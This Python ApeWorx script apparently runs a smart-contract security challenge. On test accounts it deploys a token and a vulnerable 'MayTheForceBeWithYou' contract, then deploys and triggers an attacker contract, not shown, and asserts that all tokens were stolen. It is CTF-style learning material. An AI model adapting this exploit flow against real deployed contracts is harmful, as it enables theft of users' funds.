from ape import accounts, project

CHALLENGE_TOKEN_AMOUNT = 69420


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy token and vault contracts
    print("\n--- Deploying Token and Challenge contracts ---\n")
    yoda = project.MiniMeToken.deploy(
        "Yoda Token",
        18,
        "YODA",
        sender=deployer,
    )
    challenge = project.MayTheForceBeWithYou.deploy(yoda.address, sender=deployer)
    yoda.mint(challenge.address, CHALLENGE_TOKEN_AMOUNT, sender=deployer)

    # define initial balances for attacker and challenge
    attacker_initial_bal = yoda.balanceOf(attacker.address)
    challenge_initial_bal = yoda.balanceOf(challenge.address)

    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ Challenge: {challenge_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.MayTheForceAttacker.deploy(
        challenge.address, sender=attacker
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Stole all YODA tokens from Challenge contract ---\n")

    # define ending balances for attacker and challenge
    attacker_final_bal = yoda.balanceOf(attacker.address)
    challenge_final_bal = yoda.balanceOf(challenge.address)

    print(
        f"\n--- \nFinal Balances:\n⇒ Attacker: {attacker_final_bal}\n⇒ Challenge: {challenge_final_bal}\n---\n"
    )

    assert yoda.balanceOf(challenge.address) == 0
    assert yoda.balanceOf(attacker.address) == CHALLENGE_TOKEN_AMOUNT

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
